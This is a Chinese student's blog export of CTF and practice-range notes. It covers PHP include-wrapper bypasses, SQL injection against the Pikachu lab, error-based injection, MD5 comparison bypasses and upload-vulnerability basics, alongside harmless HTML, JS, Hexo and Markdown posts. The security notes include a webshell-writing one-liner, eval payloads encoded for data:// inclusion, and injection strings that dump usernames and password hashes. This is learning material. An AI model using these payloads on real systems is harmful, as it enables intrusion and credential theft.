{"meta":{"title":"ENIC's home","subtitle":"","description":"","author":"enic","url":"https://lxy6515.github.io","root":"/"},"pages":[{"title":"关于","date":"2021-03-04T11:14:18.146Z","updated":"2021-03-04T11:14:18.146Z","comments":false,"path":"about/index.html","permalink":"https://lxy6515.github.io/about/index.html","excerpt":"","text":"学习boy,在2020年刚入大学开始加入ctfer家庭,欢迎一起学习"},{"title":"web_php_include绕过","date":"2021-03-24T11:36:42.000Z","updated":"2021-03-10T13:44:26.073Z","comments":false,"path":"ctf/include文件包含.html","permalink":"https://lxy6515.github.io/ctf/include%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.html","excerpt":"","text":"12345678&lt;?phpshow_source(__FILE__);echo $_GET[&#x27;hello&#x27;];$page=$_GET[&#x27;page&#x27;];while (strstr($page, &quot;php://&quot;)) &#123; $page=str_replace(&quot;php://&quot;, &quot;&quot;, $page);&#125;include($page);?&gt; 1. 知识储备1.1 show_source()​ show_source()展示页面源码,函数对文件进行 PHP 语法高亮显示 与highlight_file()的 同名 show_source(filename,return) return,可选如果true,函数以字符串形式返回高亮显示代码,而不是输出 1.2 strstr()​ 查找 “world” 在 “Hello world!” 中是否存在，如果是，返回该字符串及后面剩余部分 12&lt;?php echo strstr(&quot;Hello world!&quot;,&quot;world&quot;);// 输出 world!?&gt; ​ strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。 ​ strstr(string,search,[before_search]) before_search默认false,设为true,它将返回search参数第一次出现之前的字符串部分. ​ 注意:该函数区分大小写,不区分大小写为stristr() , 1.3 str_replace​ str_replace(find,replace,string,[count]) 把字符串 “Hello world!” 中的字符 “world” 替换成 “Peter”： 12&lt;?phpecho str_replace(&quot;world&quot;,&quot;Peter&quot;,&quot;Hello world!&quot;);?&gt;//结果 Hello Peter! ​ 将什么东西替换为另一个到某个地方 count一个变量，对替换数进行计数。 1234&lt;?php$arr = array(&quot;blue&quot;,&quot;red&quot;,&quot;green&quot;,&quot;yellow&quot;);print_r(str_replace(&quot;red&quot;,&quot;pink&quot;,$arr,$i));echo &quot;&lt;br&gt;&quot; . &quot;Replacements: $i&quot;;?&gt; 结果: 12Array ( [0] =&gt; blue [1] =&gt; pink [2] =&gt; green [3] =&gt; yellow )Replacements: 1 1.4 php://input (读取post数据)要求:allow_url_include = On 与include结合可以将post请求的数据当作php代码执行。 碰到file_get_contents()就要想到用php://input绕过 //用火狐的hackbar,chrome的显示不了 一句话木马 1&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt; 作用是当前目录下写入一个木马 1.5php://filter (本地磁盘文件进行读取)用法:?filename=php://filter/convert.base64-encode/resource=xxx.php ?filename=php://filter/read=convert.base64-encode/resource=xxx.php一致 以base64加密读取xxx.php 关键字还有write |分隔符 1.6file://(访问本地系统文件)filename=file://c:/boot.ini 1.7date://(流)data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4 //(the user is admin) 数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中 1.8phar://伪协议这个参数是就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。 用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php 注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 1.9zip://伪协议zip伪协议和phar协议类似，但是用法不一样。 用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php。 2.实战2.1 php strstr() 绕过，伪协议包含漏洞strstr()函数区分大小写而php不区分使用PHP://input绕过 然后上传post: 1&lt;?php system(&quot;dir&quot;);?&gt; 2.2使用data://text/plain伪协议1http:&#x2F;&#x2F;111.198.29.45:53463&#x2F;?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%3C?php%20system(%27ls%27);?%3E 2.3data://text/plain/;base64,xxx加密伪协议1&lt;?php eval($_POST[xiaohua]); ?&gt; base64加密后拼接 page=data://text/plain/;base64,PD9waHAgZXZhbCgkX1BPU1RbeGlhb2h1YV0pOyA/Pg== 再用菜刀或蚁剑连接"},{"title":"picachu靶场 sql注入(post)","date":"2021-03-07T08:04:42.000Z","updated":"2021-03-10T13:42:38.077Z","comments":true,"path":"pikachu/ctf sql注入1.html","permalink":"https://lxy6515.github.io/pikachu/ctf%20sql%E6%B3%A8%E5%85%A51.html","excerpt":"","text":"1.直接抓包看到id=1,试试能不能注入用id=1 and 1=1 依然可以查出 再试id=1 and 1=2 无法查出 ,存在sql注入 2输入 id=2 or 1 出现所有信息 3构造id=2 union select 1,2 出现 12hello,1your email is: 2 4故将2改为 database() 获取库名pikachu 5将2改为schema_name from information_schema.schemata查询所有库名 6将2改为table_name from information_schema.tables where table_schema=database()查询到表名 httpinfo,member,message,users,xssblind 7查询字段column_name from information_schema.columns where table_name=’users’ and table_schema=database()查询users表的字段 id,username,password,level 8 id=2 union select username,password FROM users 这样查询到所有user和password admine10adc3949ba59abbe56e057f20f883e (123456) pikachu670b14728ad9902aecba32e22fa4f6bd (000000) teste99a18c428cb38d5f260853678922e03 (abc123)"},{"title":"picachu靶场 sql注入(get)","date":"2021-03-07T14:04:42.000Z","updated":"2021-03-10T13:42:42.171Z","comments":true,"path":"pikachu/ctf sql注入2.html","permalink":"https://lxy6515.github.io/pikachu/ctf%20sql%E6%B3%A8%E5%85%A52.html","excerpt":"","text":"1输入name=’ 出现报错 而 输入name=’ #不报错 故单引号包裹 猜测select * from users where name=’xx’ 2构造select * from users where name=’’ or ‘1’ 出现所有用户uid和邮箱故猜测无误 3构造select * from users where name=’’ union select 1,’1’ 出现your uid:1your email is: 1 将第一个1换为database() 获取库名pikachu 4 http://172.21.240.128/pikachu/vul/sqli/sqli_str.php?name=&#39; union select group_concat(table_name) from information_schema.tables where table_schema=database(),’1&amp;submit=查询 //出错 您的SQL语法有误；检查与您的MySQL服务器版本相对应的手册，以在第1行的“ 1”附近使用正确的语法 http://172.21.240.128/pikachu/vul/sqli/sqli_str.php?name=1&#39; union select 1,table_name from information_schema.tables where table_schema=’pikachu&amp;submit=%E6%9F%A5%E8%AF%A2 查出表 httpinfo,member,message,users,xssblind 下面不再赘述"},{"title":"picachu靶场 sql注入(xx型注入)","date":"2021-03-08T08:04:42.000Z","updated":"2021-03-10T13:42:52.595Z","comments":true,"path":"pikachu/ctf sql注入4.html","permalink":"https://lxy6515.github.io/pikachu/ctf%20sql%E6%B3%A8%E5%85%A54.html","excerpt":"","text":"1输入name=1’ 出现错误爆出’1’‘) 2推测周围为: (‘’) 故构造(‘’) or 1=(‘1’) 3依据2查询出所有结果 ,猜测无误 4再次构造(‘’) union select 1,2,(‘3’) 出错 删除一行无误故一共两列 5后面不再赘述"},{"title":"picachu靶场 sql注入(盲注base on time)","date":"2021-03-09T12:54:42.000Z","updated":"2021-03-10T13:43:18.223Z","comments":true,"path":"pikachu/ctf sql注入10.html","permalink":"https://lxy6515.github.io/pikachu/ctf%20sql%E6%B3%A8%E5%85%A510.html","excerpt":"","text":"1无论输入什么都返回’i don’t care who you are!’ 2根据提示时间盲注构造 name=ee’ and if ((substr(database(),1,1)=’p’),sleep(5),1)# 如果数据库的第一个字节是a则沉睡5s如此判断是否正确 pikachu"},{"title":"picachu靶场 sql注入(搜索型注入)","date":"2021-03-08T07:04:42.000Z","updated":"2021-03-10T13:42:48.195Z","comments":true,"path":"pikachu/ctf sql注入3.html","permalink":"https://lxy6515.github.io/pikachu/ctf%20sql%E6%B3%A8%E5%85%A53.html","excerpt":"","text":"1输入 name=1’ or 1=1 –+即可出现所有查询结果 2 name=1’ order by 3 –+无误,4有错 故三列数据 3union select 1,2,database()查询库名 4后面不再赘述"},{"title":"picachu靶场 sql注入(\"insert/updata\"注入)","date":"2021-03-08T08:54:42.000Z","updated":"2021-03-10T13:42:56.854Z","comments":true,"path":"pikachu/ctf sql注入5.html","permalink":"https://lxy6515.github.io/pikachu/ctf%20sql%E6%B3%A8%E5%85%A55.html","excerpt":"","text":"1根据提示先注册账号 2登录后发送正常数据必须全为非空才会上传,使用联合查询无效,使用报错注入 3提示updata()函数 构造sex=1’ and updatexml(1,concat(0x7e,database()),1) or ‘1查询出数据库名 4 sex=1’ and updatexml(1,concat(0x7e,version()),1) or ‘1 查询版本 5 sex=1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=‘pikachu’)),1) or ‘1 查询表名"},{"title":"picachu靶场 sql注入(\"http header\"注入)","date":"2021-03-09T13:54:42.000Z","updated":"2021-03-10T13:43:05.737Z","comments":true,"path":"pikachu/ctf sql注入7.html","permalink":"https://lxy6515.github.io/pikachu/ctf%20sql%E6%B3%A8%E5%85%A57.html","excerpt":"","text":"1 使用admin 123456登录 出现 123456 ip地址:192.168.43.125你的user agent:Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.198 Safari&#x2F;537.36你的http accept:text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9你的端口（本次连接）:tcp9005 可以使用header注入 ‘ or updatexml(1,concat(0x7e,database()),1) or ‘1 爆出数据库pikachu"},{"title":"picachu靶场 sql注入(\"delete\"注入)","date":"2021-03-08T15:54:42.000Z","updated":"2021-03-10T13:43:01.515Z","comments":true,"path":"pikachu/ctf sql注入6.html","permalink":"https://lxy6515.github.io/pikachu/ctf%20sql%E6%B3%A8%E5%85%A56.html","excerpt":"","text":"1先需要知道账号密码登录 在sql注入1中有账号密码 2你的ip地址:192.168.43.125 你的user agent:Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36 你的http accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 你的端口（本次连接）:tcp2316 //出现这些数据 3在user agent中可以sql注入 “http header”注入 4User-Agent: 1’ or updatexml(1,concat(0x7e,database()),1) or ‘1 //构造 5成功"},{"title":"picachu靶场 sql注入(盲注base on boolian)","date":"2021-03-09T11:54:42.000Z","updated":"2021-03-10T13:43:09.967Z","comments":true,"path":"pikachu/ctf sql注入8.html","permalink":"https://lxy6515.github.io/pikachu/ctf%20sql%E6%B3%A8%E5%85%A58.html","excerpt":"","text":"1利用sql注入5update注入注册账号 name=ee’ and 1=1 顺利查出,换成or则失败 可能是因为被过滤了吧 2构造name=ee’ and substr(database(),1,1)=’x’ and ‘1 //同样换成or出错加深我的猜测(x为猜测数据库的第一个字母) 3一位一位爆破可得出数据库为’pikachu’ 4"},{"title":"picachu靶场 sql注入(盲注base on time)","date":"2021-03-09T12:54:42.000Z","updated":"2021-03-10T13:43:13.998Z","comments":true,"path":"pikachu/ctf sql注入9.html","permalink":"https://lxy6515.github.io/pikachu/ctf%20sql%E6%B3%A8%E5%85%A59.html","excerpt":"","text":"1无论输入什么都返回’i don’t care who you are!’ 2根据提示时间盲注构造 name=ee’ and if ((substr(database(),1,1)=’p’),sleep(5),1)# 如果数据库的第一个字节是a则沉睡5s如此判断是否正确 pikachu"}],"posts":[{"title":"报错注入基础","slug":"报错注入基础","date":"2021-03-08T09:22:25.000Z","updated":"2021-03-10T11:24:48.376Z","comments":true,"path":"2021/03/08/报错注入基础/","link":"","permalink":"https://lxy6515.github.io/2021/03/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","excerpt":"","text":"xpath报错注入（extractvalue和updatexml）一. 知识铺垫 在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数： updatexml（） extractvalue（） 当这两个函数在执行时，如果出现xml文档路径错误就会产生报错 updatexml（）函数 updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。 作用：改变文档中符合条件的节点的值 语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据 updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax） 例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。 **extractvalue（）函数** 此函数从目标XML中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))); extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax） select user,password from users where user_id=1 and (extractvalue(1,0x7e)); 由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。","categories":[{"name":"学习","slug":"学习","permalink":"https://lxy6515.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"报错注错","slug":"报错注错","permalink":"https://lxy6515.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E9%94%99/"}]},{"title":"html特殊符号","slug":"html特殊符号","date":"2021-02-26T15:25:52.000Z","updated":"2021-02-26T17:29:58.430Z","comments":true,"path":"2021/02/26/html特殊符号/","link":"","permalink":"https://lxy6515.github.io/2021/02/26/html%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7/","excerpt":"","text":"HTML特殊符号 箭头 其他 &rarr; &amp;rarr &reg; 注册商标 &larr; &amp;larr &copy; 版权所有 &uarr; &amp;uarr &trade; 商标 &darr; &amp;darr [^]:","categories":[{"name":"学习","slug":"学习","permalink":"https://lxy6515.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"html学习","slug":"html学习","permalink":"https://lxy6515.github.io/tags/html%E5%AD%A6%E4%B9%A0/"}]},{"title":"md5绕过","slug":"md5绕过","date":"2021-02-26T12:34:04.000Z","updated":"2021-02-26T17:34:50.432Z","comments":true,"path":"2021/02/26/md5绕过/","link":"","permalink":"https://lxy6515.github.io/2021/02/26/md5%E7%BB%95%E8%BF%87/","excerpt":"","text":"PHP中md5绕过1.md5($password,ture)的sql注入1.1 当数字与字符串比较时,若字符串的数字部分和数字是相同的,那么返回true.123select if(1&#x3D;&quot;1a&quot;,&quot;相等&quot;,&quot;不相等&quot;) as testas 作为别名使用if(x,y,z) 类似于三元运算符,x成立,返回y,否则z 1.2 以数字开头的字符串,若开头的字符串不是0,那么在做逻辑运算时候返回1,也就是true.1select * from user where password &#x3D;&#39;&#39;or&#39;1234a&#39;; 注: ‘1234a’会当做true对待,任何数和true做逻辑运算返回值都是true 1.3 例子1select * from usera where username &#x3D; &#39;admin&#39; and password &#x3D; md5($pass,true) 有一个很特殊的字符串”ffifdyop“ 他的md5=276f722736c95d99e921722cf9ed621c 翻译为字符为 ‘or’6�]��!r,��b\u001c 拼接 1select * from usera where username = &#x27;admin&#x27; and password =&#x27;&#x27;or&#x27;6�]��!r,��b\u001c&#x27; 注:md5为128二进制数组成(16字节) 一般用16进制32位表示,如上27代表 ‘ , 6f 代表o , 72 代表r . 成功的绕过只需要知道username就可以查询到密码 2.不相等值,相同md5绕过2.1 == 弱相等绕过知识储备: 12345678&lt;?php $str &#x3D; &quot;0dff&quot;;if (0 &#x3D;&#x3D; $str) &#123; echo &quot;true&quot;;&#125;else&#123; echo &quot;false&quot;;&#125;?&gt; 如上执行结果为true,原因是在==下,细节过程为 1. 判断左边类型; 2. 判断右边类型,若于左边不一致,强制转换为与左边一致 这样结果就是 0== “odff” → 0==”0” &rarr; true 在强制转换中,若开头为0x判断为16进制,0开头数字为8进制,0b开口2进制, . 为浮点数标志,e或E为科学计数法标志. md5() 函数不能处理数组，数组都返回 null，md5(a[]) 结果为 null。 在md5以0e或0E开头数 QNKCDZO 240610708 s878926199a s155964671a 在sha1中 aaroZmOk aaK1STfY 2.2 === 强比较绕过 利用md()函数无法处理数字传参时构造如a[]=1&amp;b[]=2,将a b强制为数组 3.MD5的碰撞123456if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123; echo `$cmd`; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125; 这里有一个强制类型转化，若传入数组转化后的结果都是字符串Array。这里需要用到的是MD5碰撞，也就是不同字符串但是MD5后值相同的情况。下面的任意两组字符串内容不同，但md5结果相同 123$s1 &#x3D; &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;$s2 &#x3D; &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;$s3 &#x3D; &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot; 又如: 1234567这边我们记2个固定的值(都是经过了url编码后的);例1a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2例2a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2","categories":[{"name":"教学","slug":"教学","permalink":"https://lxy6515.github.io/categories/%E6%95%99%E5%AD%A6/"}],"tags":[{"name":"md5教学","slug":"md5教学","permalink":"https://lxy6515.github.io/tags/md5%E6%95%99%E5%AD%A6/"}]},{"title":"js学习","slug":"js学习","date":"2021-02-24T08:04:42.000Z","updated":"2021-02-26T17:29:57.350Z","comments":true,"path":"2021/02/24/js学习/","link":"","permalink":"https://lxy6515.github.io/2021/02/24/js%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"1.String.fromCharCode(65,97)将 Unicode 编码转为一个字符 上述转换为Aa 也有String[&quot;fromCharCode&quot;](&quot;65,97&quot;)这种用法 2.alert()弹出提示框3.string.split(separator,limit)separator 分隔符;分割器 将string以separator分割若有limit将限制个数 如str=”a,b,c,d” var 1st = str.split(“,”,2);那么1st就是一个数组并且1st=[a,b] 5.console.log()打印变量 6.document.write(“hello,world”)用脚本打印字,也可打印变量 7.弹窗7.1 警告框​ alert()或window.alert()使用警告框 7.2确认框​ 用window.confirm可以不带window对象,直接使用confirm ​ 确认返回true,取消返回false 7.3提示框prompt(msg,defaultText) 提示用户输入并返回用户输入的字符串 msg为提示内容,defultText为默认文本,全为可选","categories":[{"name":"学习","slug":"学习","permalink":"https://lxy6515.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"js学习","slug":"js学习","permalink":"https://lxy6515.github.io/tags/js%E5%AD%A6%E4%B9%A0/"}]},{"title":"信息收集之查找GitHub作者邮箱","slug":"github邮箱查询","date":"2021-02-21T11:10:30.000Z","updated":"2021-02-26T17:30:00.633Z","comments":true,"path":"2021/02/21/github邮箱查询/","link":"","permalink":"https://lxy6515.github.io/2021/02/21/github%E9%82%AE%E7%AE%B1%E6%9F%A5%E8%AF%A2/","excerpt":"","text":"1.通过GitHub API接口查找1https:&#x2F;&#x2F;api.github.com&#x2F;users&#x2F;&lt;name&gt;&#x2F;events&#x2F;public 2.通过commitsurl加.patch","categories":[],"tags":[{"name":"教学","slug":"教学","permalink":"https://lxy6515.github.io/tags/%E6%95%99%E5%AD%A6/"}]},{"title":"ctf学习","slug":"local伪造","date":"2021-02-21T04:13:10.000Z","updated":"2021-02-26T17:29:53.975Z","comments":true,"path":"2021/02/21/local伪造/","link":"","permalink":"https://lxy6515.github.io/2021/02/21/local%E4%BC%AA%E9%80%A0/","excerpt":"","text":"1.伪造X-Forwarded-For: 127.0.0.1 Referer:https://www.google.com 2. 上传漏洞2.1危害上传木马获取webshell(动态脚本,网页后门) 2.2漏洞利用1234小马:上传小马,体积小,功能少大马:海阳ASP大马,c99shell大马,R59大马一句话木马:APS一句话木马,PHP一句话木马,JSP一句话木马WebShell工具:中国菜刀,中国蚁剑,冰蝎 大马攻击:操控磁盘,执行命令,盗密拖库,挂黑页","categories":[{"name":"学习","slug":"学习","permalink":"https://lxy6515.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"xff和referer伪造, 上传漏洞","slug":"xff和referer伪造-上传漏洞","permalink":"https://lxy6515.github.io/tags/xff%E5%92%8Creferer%E4%BC%AA%E9%80%A0-%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"hexo教学与常用标签","slug":"hexo教学","date":"2021-02-19T15:36:09.000Z","updated":"2021-02-26T17:29:59.416Z","comments":true,"path":"2021/02/19/hexo教学/","link":"","permalink":"https://lxy6515.github.io/2021/02/19/hexo%E6%95%99%E5%AD%A6/","excerpt":"","text":"常用命令12345678910111213141516常见命令：hexo new &quot;postName&quot; # 新建文章hexo new page &quot;pageName&quot; # 新建页面hexo generate # 生成静态页面至public目录hexo server # 开启预览访问端口（默认端口4000，&#39;ctrl + c&#39;关闭server）hexo deploy # 部署到GitHubhexo help # 查看帮助hexo version # 查看Hexo的版本缩写命令：hexo n &#x3D;&#x3D; hexo newhexo g &#x3D;&#x3D; hexo generatehexo s &#x3D;&#x3D; hexo serverhexo d &#x3D;&#x3D; hexo deploy组合命令：hexo s -g # 生成并本地预览hexo d -g # 生成并上传 文章索引目录123456title: 文章标题categories: - 文章分类tags: - 文章标签toc: true # 是否启用内容索引","categories":[{"name":"教学","slug":"教学","permalink":"https://lxy6515.github.io/categories/%E6%95%99%E5%AD%A6/"}],"tags":[{"name":"heox教学","slug":"heox教学","permalink":"https://lxy6515.github.io/tags/heox%E6%95%99%E5%AD%A6/"}]},{"title":"markdown教学","slug":"markdown教学","date":"2021-02-19T13:05:15.000Z","updated":"2021-02-26T17:29:52.875Z","comments":true,"path":"2021/02/19/markdown教学/","link":"","permalink":"https://lxy6515.github.io/2021/02/19/markdown%E6%95%99%E5%AD%A6/","excerpt":"","text":"Markdown标题1用# 代表标题,一级标题一个#二级两个 字体斜体1*斜体* 粗体1**粗体** 很显然如果要斜体还要粗体用*** 删除线1~~删除线~~ 分割线1***或--- 引用1234&gt;这是引用的内容&gt;&gt;这是引用的内容&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;这是引用的内容可以无限引用&gt;嵌套引用 图片1![图片名称](url或本地地址) 超链接1[描述文字](url) 列表12|语文|数学|英语||60|61|59| 语文 数学 英语 60 61 59 